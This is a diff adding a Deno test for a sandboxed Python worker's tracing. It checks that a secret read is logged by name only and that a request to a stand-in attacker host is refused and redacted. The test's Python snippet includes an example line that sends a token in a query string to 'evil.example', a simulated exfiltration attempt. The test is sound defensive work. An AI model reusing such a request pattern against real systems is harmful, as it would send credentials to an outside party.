@@ -228,6 +228,25 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         }, `https://${CDN_HOST}/js/src/index.js`);
         if (!capped.includes("budget exceeded")) throw new Error(`declared op cap: expected a budget error, got ${JSON.stringify(capped)}`);
 
+        // A traced run reports what it reached, a secret by its name and a url without its query.
+        const trace = await page.evaluate(async (host) => {
+            const { createWorker } = await import(host);
+            const worker = await createWorker({ wasmUrl: "https://cdn.edgepython.com/compiler.wasm", trace: true, permissions: { main: ["secret:API_KEY", "net"] }, secrets: { API_KEY: "k-123" } });
+            const events = [];
+            worker.onTrace((event) => events.push(event));
+            await worker.run("import net\nimport secret\nsecret.read('API_KEY')\nprint('read it')\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456', {}, None)\nexcept PermissionError as e:\n    pass\n");
+            worker.dispose();
+            return events;
+        }, `https://${CDN_HOST}/js/src/index.js`);
+        const said = JSON.stringify(trace);
+        const call = (name) => trace.find((event) => event.kind === "call" && event.call === name);
+        if (call("secret.read")?.scope !== "API_KEY" || call("secret.read")?.outcome !== "ok") throw new Error(`trace: no secret.read of API_KEY in ${said}`);
+        if (call("net.request")?.scope !== "GET evil.example/x" || call("net.request")?.outcome !== "PermissionError") throw new Error(`trace: no refused request in ${said}`);
+        if (!trace.some((event) => event.kind === "print" && event.text.includes("read it"))) throw new Error(`trace: no print in ${said}`);
+        if (said.includes("k-123") || said.includes("t-456")) throw new Error(`trace: a secret or a query leaked into ${said}`);
+        if (!trace.every((event) => event.at >= 0)) throw new Error(`trace: an event before the run began in ${said}`);
+        if (trace[0]?.kind !== "run" || !(trace[0].epoch > 0)) throw new Error(`trace: no run start leads ${said}`);
+
         // Laziness, only what the corpus imports gets fetched, and a JavaScript import is refused before any fetch.
         if (reqd("/app/ui.js")) throw new Error("ui is JavaScript, yet ui.js was fetched");
         if (!reqd("/pkg/json/")) throw new Error("json imported but its package was never fetched");
